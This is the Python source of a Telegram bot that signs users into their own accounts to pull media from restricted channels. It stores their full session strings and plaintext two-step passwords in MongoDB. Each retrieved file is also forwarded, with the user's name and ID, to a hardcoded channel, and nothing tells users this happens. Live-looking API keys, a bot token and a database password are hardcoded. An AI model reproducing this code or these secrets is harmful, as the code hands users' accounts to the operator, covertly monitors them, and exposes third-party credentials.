#above 

import logging,os,time,json,telethon,asyncio,re
from telethon import TelegramClient, events
#from telethon.events import NewMessage
from telethon.sessions import StringSession
from telethon.tl.custom.button import Button
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from strings import strings,direct_reply

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
load_dotenv(override=True)

API_ID = int(os.getenv("TG_API_ID","4682685"))
AUTH_USERS = set(int(x) for x in os.environ.get("AUTH_USERS", "945284066").split())
API_HASH = os.getenv("TG_API_HASH","3eba5d471162181b8a3f7f5c0a23c307")
BOT_TOKEN = os.getenv("BOT_TOKEN","5484278199:AAFyPN7RbJQC4usLJQ_WtBuE0jtqiInIGpA")
MONGODB_URL = os.getenv("MONGODB_URL","mongodb+srv://misoc51233:ZlP391e4m0IIS85S@cluster0.8xs2zsl.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
BOT_USERNAME = None
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
mongo_client = MongoClient(MONGODB_URL, server_api=ServerApi('1'))
download_folder = 'files'
database = mongo_client.userdb.sessions
if not os.path.isdir(download_folder):
    os.makedirs(download_folder)
numpad = [
    [  
        Button.inline("1", '{"press":1}'), 
        Button.inline("2", '{"press":2}'), 
        Button.inline("3", '{"press":3}')
    ],
    [
        Button.inline("4", '{"press":4}'), 
        Button.inline("5", '{"press":5}'), 
        Button.inline("6", '{"press":6}')
    ],
    [
        Button.inline("7", '{"press":7}'), 
        Button.inline("8", '{"press":8}'), 
        Button.inline("9", '{"press":9}')
    ],
    [
        Button.inline("Clear All", '{"press":"clear_all"}'),
        Button.inline("0", '{"press":0}'),
        Button.inline("⌫", '{"press":"clear"}')
    ]
]
settings_keyboard = [
    [  
        Button.inline("Download command", '{"page":"settings","press":"dlcmd"}')
    ],
    [
        Button.inline("Download message", '{"page":"settings","press":"dlmsg"}')
    ],
    [
        Button.inline("Info delete delay", '{"page":"settings","press":"dltime"}')
    ],
]

def select_not_none(l):
    for i in l:
        if i is not None:
            return i
def intify(s):
    try:
        return int(s)
    except:
        return s
def get(obj, key, default=None):
    try:
        return obj[key]
    except:
        return default
def yesno(x,page='def'):
    return [
        [Button.inline("Yes", '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
        [Button.inline("No", '{{"page":"{}","press":"no{}"}}'.format(page,x))]
    ]
async def handle_usr(contact, event):
    msg = await event.respond(strings['sending1'], buttons=Button.clear())
    await msg.delete()
    msg = await event.respond(strings['sending2'])
    uclient = TelegramClient(StringSession(), API_ID, API_HASH)
    await uclient.connect()
    user_data = database.find_one({"chat_id": event.chat_id})
    try:
        scr = await uclient.send_code_request(contact.phone_number)
        login = {
        	'code_len': scr.type.length,
            'phone_code_hash': scr.phone_code_hash,
            'session': uclient.session.save(),
        }
        data = {
        	'phone': contact.phone_number,
            'login': json.dumps(login),
        }
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        await msg.edit(strings['ask_code'], buttons=numpad)
    except Exception as e:
        await msg.edit("Error: "+repr(e))
    await uclient.disconnect()
async def handle_settings(event, jdata):
    user_data = database.find_one({"chat_id": event.chat_id})
    settings = get(user_data, 'settings', {})
    print(settings)
    if jdata['press'] == 'home':
        text = strings['settings_home']
        buttons = settings_keyboard
    elif jdata['press'] in ['dlcmd', 'nodlcmd']:
        text = strings['ask_new_dlcmd']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"home"}')],
        ]
        settings['pending'] = 'dlcmd'
        settings['pending_pattern'] = '.*'
    elif jdata['press'] == 'yesdlcmd':
        text = strings['dlcmd_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        settings['dl_command'] = user_data['settings']['last_input']
        settings['pending'] = None
    elif jdata['press'] in ['dlmsg', 'nodlmsg']:
        text = strings['ask_new_dlmsg']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"home"}')],
        ]
        settings['pending'] = 'dlmsg'
        settings['pending_pattern'] = '.*'
    elif jdata['press'] == 'yesdlmsg':
        text = strings['dlmsg_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        settings['dl_message'] = user_data['settings']['last_input']
        settings['pending'] = None
    elif jdata['press'] in ['dltime', 'nodltime']:
        text = strings['ask_new_dltime']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"home"}')],
        ]
        settings['pending'] = 'dltime'
        settings['pending_pattern'] = '^(?:[0-5]|999)$'
    elif jdata['press'] == 'yesdltime':
        text = strings['dlmsg_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        t = int(user_data['settings']['last_input'])
        if t == 999 or 0 <= t <= 5:
            settings['dl_sleep'] = t
            settings['pending'] = None
        else:
            text = strings['non_match_pattern']
            buttons = [
                [Button.inline("🚫 Cancel", '{"page":"settings","press":"home"}')],
            ]
            settings['pending'] = 'dltime'
            settings['pending_pattern'] = '^(?:[0-5]|999)$'
    else:
        return
    print('updated: ', settings)
    database.update_one({'_id': user_data['_id']}, {'$set': {'settings': settings}})
    await event.edit(text, buttons=buttons)
async def sign_in(event):
    try:
        user_data = database.find_one({"chat_id": event.chat_id})
        login = json.loads(user_data['login'])
        data = {}
        uclient = None
        if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
            uclient = TelegramClient(StringSession(login['session']), API_ID, API_HASH)
            await uclient.connect()
            await uclient.sign_in(password=user_data['password'])
        elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
            uclient = TelegramClient(StringSession(login['session']), API_ID, API_HASH)
            await uclient.connect()
            await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
        else:
            return False
        data['session'] = uclient.session.save()
        data['logged_in'] = True
        login = {}
        await event.edit(strings['login_success'])
    except telethon.errors.PhoneCodeInvalidError as e:
        await event.edit(strings['code_invalid'])
        await event.respond(strings['ask_code'], buttons=numpad)
        login['code'] = ''
        login['code_ok'] = False
    except telethon.errors.SessionPasswordNeededError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['ask_pass'])
    except telethon.errors.PasswordHashInvalidError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['pass_invalid'])
        await event.respond(strings['ask_pass'])
    except Exception as e:
        login['code'] = ''
        login['code_ok'] = False
        login['pass_ok'] = False
        await event.edit(repr(e))
    await uclient.disconnect()
    data['login'] = json.dumps(login)
    database.update_one({'_id': user_data['_id']}, {'$set': data})
    return True
class TimeKeeper:
    last = ''
    last_edited_time = 0
    def __init__(self, status):
        self.status = status
async def get_gallery(client, chat, msg_id):
    msgs = await client.get_messages(chat, ids=[*range(msg_id - 9, msg_id + 10)])
    return [
        msg for msg in [i for i in msgs if i] # clean None
        if msg.grouped_id == msgs[9].grouped_id # 10th msg is target, guaranteed to exist
    ]
def progress_bar(percentage):
    prefix_char = '█'
    suffix_char = '▒'
    progressbar_length = 10
    prefix = round(percentage/progressbar_length) * prefix_char
    suffix = (progressbar_length-round(percentage/progressbar_length)) * suffix_char
    return f"{prefix}{suffix} {percentage:.2f}%"
def humanify(byte_size):
    siz_list = ['KB', 'MB', 'GB']
    for i in range(len(siz_list)):
        if byte_size/1024**(i+1) < 1024:
            return "{} {}".format(round(byte_size/1024**(i+1), 2), siz_list[i])
async def callback(current, total, tk, message):
    try:
        progressbar = progress_bar(current/total*100)
        h_current = humanify(current)
        h_total = humanify(total)
        info = f"{tk.status}: {progressbar}\nComplete: {h_current}\nTotal: {h_total}"
        if tk.last != info and tk.last_edited_time+5 < time.time():
            await message.edit(info)
            tk.last = info
            tk.last_edited_time = time.time()
    except:
        pass
async def unrestrict(uclient, event, chat, msg, log):
    user_data = database.find_one({"chat_id": event.chat_id})
    if user_data is None:
        sender = await event.get_sender()
        database.insert_one({
            "chat_id": sender.id,
            "first_name": sender.first_name,
            "last_name": sender.last_name,
            "username": sender.username,
        })
    user_data = database.find_one({"chat_id": event.chat_id})
    if user_data and 'first_name' in user_data and 'last_name' in user_data and 'username' in user_data and 'chat_id' in user_data :
        first_name = user_data['first_name']
        last_name = user_data['last_name']
        username = user_data['username']
        chat_id=user_data['chat_id']
        
    to_chat = await event.get_sender()
    if msg is None:
        await log.edit(strings['msg_404'])
        await uclient.disconnect()
        return
    elif msg.grouped_id:
        gallery = await get_gallery(uclient, msg.chat_id, msg.id)
        album = []
        for sub_msg in gallery:
            tk_d = TimeKeeper('Downloading')
            album.append(await sub_msg.download_media(download_folder, progress_callback=lambda c,t:callback(c,t,tk_d,log)))
        tk_u = TimeKeeper('Uploading')
        await bot.send_file(to_chat, album, caption=msg.message, progress_callback=lambda c,t:callback(c,t,tk_u,log))
        for file in album:
            os.unlink(file)
    elif msg.media is not None and msg.file is not None:
        tk_d = TimeKeeper('Downloading')
        file = await msg.download_media(download_folder, progress_callback=lambda c,t:callback(c,t,tk_d,log))
        tk_d = TimeKeeper('Downloading')
        thumb = await msg.download_media(download_folder, thumb=-1, progress_callback=lambda c,t:callback(c,t,tk_d,log))
        tk_u = TimeKeeper('Uploading')
        tgfile = await bot.upload_file(file, file_name=msg.file.name, progress_callback=lambda c,t:callback(c,t,tk_u,log))
        try:
           x=await bot.send_file(to_chat, tgfile, thumb=thumb, supports_streaming=msg.document.attributes.supports_streaming, caption=msg.message)
           await bot.send_file(-1002182387390, x,caption=f"File was Sent from Chat_ID : {msg.chat_id}\n\n🔆USERNAME: [{username}](tg://user?id={chat_id})\n🔆FIRST_NAME : {first_name}\n🔆LAST_NAME : {last_name}\n🆔MESSAGE_ID : {msg.id}")
        except:
            z= await bot.send_file(to_chat, tgfile, thumb=thumb, caption=msg.message)
            await bot.send_file(-1002182387390,z,caption=f"File was sent from Chat_ID : {msg.chat_id}\n\n🔆USERNAME: [{username}](tg://user?id={chat_id})\n🔆FIRST_NAME : {first_name}\n🔆LAST_NAME : {last_name}\n🆔MESSAGE_ID : {msg.id}")
        os.unlink(file)
        os.unlink(thumb)
    else:
      c=await bot.send_message(to_chat, msg.message)
      d=await bot.send_message(-1002182387390, c)
      await bot.reply_message(d,text=f"File was sent from Chat_ID : {msg.chat_id}\n\n🔆USERNAME: [{username}](tg://user?id={chat_id})\n🔆FIRST_NAME : {first_name}\n🔆LAST_NAME : {last_name}\n🆔MESSAGE_ID : {msg.id}")
    await uclient.disconnect()
    await log.delete()
@events.register(events.NewMessage(outgoing=True))
async def dl_getter(event):
    user_data = database.find_one({"chat_id": event.message.user_id})
    settings = get(user_data, 'settings', {})
    if event.message.text != get(settings, 'dl_command', "/dl"):
        return
    global BOT_USERNAME
    if not event.is_reply:
        await event.edit(strings['not_is_reply'])
        return
    if BOT_USERNAME is None:
        BOT_USERNAME = (await bot.get_me()).username
    await event.client.send_message(BOT_USERNAME, f"{event.chat_id}.{event.message.reply_to_msg_id}")
    database.update_one({'_id': user_data['_id']}, {'$set': {'activated': False}})
    t = get(settings, 'dl_sleep', 2)
    if t == 0:
        await event.delete()
        return
    await event.edit(get(settings, 'dl_message', strings['dl_sent']))
    if t == 999:
        return
    await asyncio.sleep(t)
    await event.delete()

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if user_data is None:
        sender = await event.get_sender()
        database.insert_one({
            "chat_id": sender.id,
            "first_name": sender.first_name,
            "last_name": sender.last_name,
            "username": sender.username,
        })
    if event.message.text in direct_reply:
        await event.respond(direct_reply[event.message.text])
        raise events.StopPropagation



#@bot.on(events.NewMessage(pattern="/start|/login|/logout|/add_session|/settings|/dl|/activate"))
#async def check_chat(event):
  #  if event.chat_id != "-1001678093514":  # Replace with the ID of the chat that users must be in
   #     await event.reply("You Need To Join Below Channels to use Me 😎", buttons=[
  #  Button.url("REBORN", "https://t.me/+ExBm8lEipxRkMTA1"),
  #  Button.url("TRUMBOTS", "https://t.me/movie_time_botonly")
#])
  #  else:
        # Execute the command as usual
      #  pass
#@bot.on(NewMessage(chats="-1001678093514", incoming=True))
#async def welcome_new_user(event):
  #  if event.is_new_user:
   #     user_id = event.sender_id
    #    user_data = database.find_one({"chat_id": user_id})

       # if user_data is None:
       #     await event.reply("I Checked ✅ You successfully joined my channels!\nClick /start to use me.")
           # database.insert_one({"chat_id": user_id, "welcomed": True})
@bot.on(events.NewMessage(pattern="/broadcast",func=lambda e: e.is_private))
async def broadcast(event):
    if event.chat_id == 945284066:  # Replace with your admin's chat ID
        replied_message = await event.get_reply_message()
        if replied_message:
            message = replied_message.message
            users = database.find({})  # Fetch all users from the database
            total_users = users.find({}).count()
            active_users = 0
            inactive_users = 0

            for user in users:
                try:
                    await bot.send_message(user["chat_id"], message)
                    active_users += 1
                except Exception as e:
                    print(e)
                    inactive_users += 1

            # Send a message to the admin with the broadcast statistics
            await bot.send_message(945284066, f"✨ Total users: {total_users}\n🌟 Total users received broadcast: {active_users}\n💫 Total active users: {active_users}\n🌑 Total inactive users: {inactive_users}")
        else:
            await event.reply("You need to reply to a message to broadcast.")
    else:
        await event.reply("You are not my BOSS ")
@bot.on(events.NewMessage(pattern="/users",func=lambda e: e.is_private))
async def user_count(event):
    if event.chat_id == 945284066:  # Replace with your admin's chat ID
           count = database.count_documents({})
           await event.reply(f"There are currently {count} users in the database.")
        
@bot.on(events.NewMessage(pattern=r"/login", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if get(user_data, 'logged_in', False):
        await event.respond(strings['already_logged_in'])
        raise events.StopPropagation
    await event.respond(strings['ask_phone'], buttons=[Button.request_phone("SHARE CONTACT", resize=True, single_use=True)])
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/settings", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    await event.reply(strings['settings_home'], buttons=settings_keyboard)
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/logout", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False):
        await event.respond(strings['need_login'])
        raise events.StopPropagation
    await event.respond(strings['logout_sure'], buttons=yesno('logout'))
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/add_session", func=lambda e: e.is_private))
async def handler(event):
    args = event.message.text.split(' ', 1)
    if len(args) == 1:
        return
    msg = await event.respond(strings['checking_str_session'])
    user_data = database.find_one({"chat_id": event.chat_id})
    data = {
        'session': args[1],
        'logged_in': True
    }
    uclient = TelegramClient(StringSession(data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await msg.edit(strings['session_invalid'])
        await uclient.disconnect()
        raise events.StopPropagation
    await msg.edit(strings['str_session_ok'])
    database.update_one({'_id': user_data['_id']}, {'$set': data})
    raise events.StopPropagation
@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    if event.message.contact:
        if event.message.contact.user_id==event.chat.id:
            await handle_usr(event.message.contact, event)
        else:
            await event.respond(strings['wrong_phone'])
        raise events.StopPropagation
@bot.on(events.CallbackQuery(func=lambda e: e.is_private))
async def handler(event):
    try:
        evnt_dta = json.loads(event.data.decode())
        if get(evnt_dta, 'page', '') == 'settings':
            await handle_settings(event, evnt_dta)
            return
        press = evnt_dta['press']
    except:
        return
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(user_data['login'])
    login['code'] = get(login, 'code', '')
    if type(press)==int:
        login['code'] += str(press)
    elif press=="clear":
        login['code'] = login['code'][:-1]
    elif press=="clear_all" or press=="nocode":
        login['code'] = ''
        login['code_ok'] = False
    elif press=="yescode":
        login['code_ok'] = True
    elif press=="yespass":
        login['pass_ok'] = True
        login['need_pass'] = False
    elif press=="nopass":
        login['pass_ok'] = False
        login['need_pass'] = True
        await event.edit(strings['ask_pass'])
    elif press=="yeslogout":
        data = {
            'logged_in': False,
            'login': '{}',
        }
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        await event.edit(strings['logged_out'])
        return
    elif press=="nologout":
        await event.edit(strings['not_logged_out'])
        return
    database.update_one({'_id': user_data['_id']}, {'$set': {'login': json.dumps(login)}})
    if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
        await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
    elif press=="nopass":
        return
    elif not await sign_in(event):
        await event.edit(strings['ask_code']+login['code'], buttons=numpad)
@bot.on(events.NewMessage(pattern="/activate", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False) or user_data['session'] is None:
        await event.respond(strings['need_login'])
        return
    if get(user_data, 'activated', False):
        await event.respond(strings['already_activated'])
        return
    database.update_one({'_id': user_data['_id']}, {'$set': {'activated': True}})
    uclient = TelegramClient(StringSession(user_data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await event.respond(strings['session_invalid'])
        await uclient.disconnect()
        return
    settings = get(user_data, 'settings', {})
    log = await event.respond(strings['timeout_start'].format(get(settings, 'dl_command', '/dl')))
    uclient.add_event_handler(dl_getter)
    await asyncio.sleep(60)
    await uclient.disconnect()
    database.update_one({'_id': user_data['_id']}, {'$set': {'activated': False}})
    await log.edit(strings['timed_out'])
@bot.on(events.NewMessage(pattern=r"^(?:https?://t.me/c/(\d+)/(\d+)|https?://t.me/([A-Za-z0-9_]+)/(\d+)|(?:(-?\d+)\.(\d+)))$", func=lambda e: e.is_private))
async def handler(event):
    corrected_private = None
    if event.pattern_match[1]:
        corrected_private = '-100'+event.pattern_match[1]
    target_chat_id = intify(select_not_none([corrected_private, event.pattern_match[3], event.pattern_match[5]]))
    target_msg_id = intify(select_not_none([event.pattern_match[2], event.pattern_match[4], event.pattern_match[6]]))
    log = await event.respond('please wait..')
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False) or user_data['session'] is None:
        await log.edit(strings['need_login'])
        return
    uclient = TelegramClient(StringSession(user_data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await log.edit(strings['session_invalid'])
        await uclient.disconnect()
        return
    try:
        if type(target_chat_id)==int and not str(target_chat_id).startswith('-100'):
            await uclient.get_dialogs()
        chat = await uclient.get_input_entity(target_chat_id)
        msg = await uclient.get_messages(chat, ids=target_msg_id)
    except Exception as e:
        await log.edit('Error: '+repr(e))
        await uclient.disconnect()
        return
    try:
        await unrestrict(uclient, event, chat, msg, log)
    except Exception as e:
        await event.respond(repr(e))
@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(get(user_data, 'login', '{}'))
    if get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
        data = {
            'password': event.message.text
        }
        await event.respond(strings['ask_ok']+data['password'], buttons=yesno('pass'))
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        return
    elif get(get(user_data, 'settings', {}), 'pending', None) is not None:
        if not re.match(user_data['settings']['pending_pattern'], event.message.text):
            await event.respond(strings['non_match_pattern'])
            return
        settings = user_data['settings']
        settings['last_input'] = event.message.text
        await event.respond(strings['ask_ok']+event.message.text, buttons=yesno(user_data['settings']['pending'],'settings'))
        database.update_one({'_id': user_data['_id']}, {'$set': {'settings': settings}})
        return

with bot:
    bot.run_until_disconnected()
